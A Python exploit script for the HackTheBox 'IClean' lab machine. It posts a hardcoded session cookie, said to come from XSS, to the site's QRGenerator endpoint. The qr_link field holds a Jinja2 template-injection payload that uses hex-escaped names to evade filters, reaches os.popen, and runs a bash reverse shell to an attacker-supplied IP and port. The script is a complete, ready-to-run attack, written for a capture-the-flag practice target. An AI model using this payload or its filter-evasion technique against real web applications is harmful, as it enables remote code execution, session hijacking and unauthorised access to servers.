#!/usr/bin/python3

import requests
import sys
import argparse


default_cookie: str = 'eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.ZlE6uQ.qXOyV6dJVUEmksNhtOzJGR3_sLU'


def parse_arguments()->argparse.Namespace:
    parser = argparse.ArgumentParser(description='Reverse Shell to "HackTheBox IClean" machine.')

    # Add arguments
    parser.add_argument('-i', '--ip', type=str, help='Your attacker Ip to connect from the target machine', required=True)
    parser.add_argument('-p', '--port', type=int, help='Listening port to get reverse shell', required=True)
    parser.add_argument('-c', '--cookie', type=str, help=f'Cookie found from XXS. Only change this value if the cookie is different from {default_cookie!r}', 
                        default=default_cookie)

    # Return arguments
    return parser.parse_args()


def make_request_server(args: argparse.Namespace)->None:
    url = "http://capiclean.htb:80/QRGenerator"
    cookies_value = {"session": args.cookie}
    generic_header = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                      "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", 
                      "Content-Type": "application/x-www-form-urlencoded", "Origin": "http://capiclean.htb", 
                      "DNT": "1", "Connection": "close", "Referer": "http://capiclean.htb/QRGenerator", 
                      "Upgrade-Insecure-Requests": "1"}
    payload: str = f"{{{{request|attr(\"application\")|attr(\"\\x5f\\x5fglobals\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fbuiltins\\x5f\\x5f\")|attr(\"\\x5f\\x5fgetitem\\x5f\\x5f\")(\"\\x5f\\x5fimport\\x5f\\x5f\")(\"os\")|attr(\"popen\")(\"bash -c 'bash -i >& /dev/tcp/{args.ip}/{args.port} 0>&1'\")|attr(\"read\")()}}}}"
    post_data = {"invoice_id": '', "form_type": "scannable_invoice", "qr_link": payload}
    requests.post(url, headers=generic_header, cookies=cookies_value, data=post_data)
    return


def main()->None:
    # Get arguments from user
    args = parse_arguments()
    # Make the reverse shell request
    make_request_server(args)


if __name__ == "__main__":
    main()
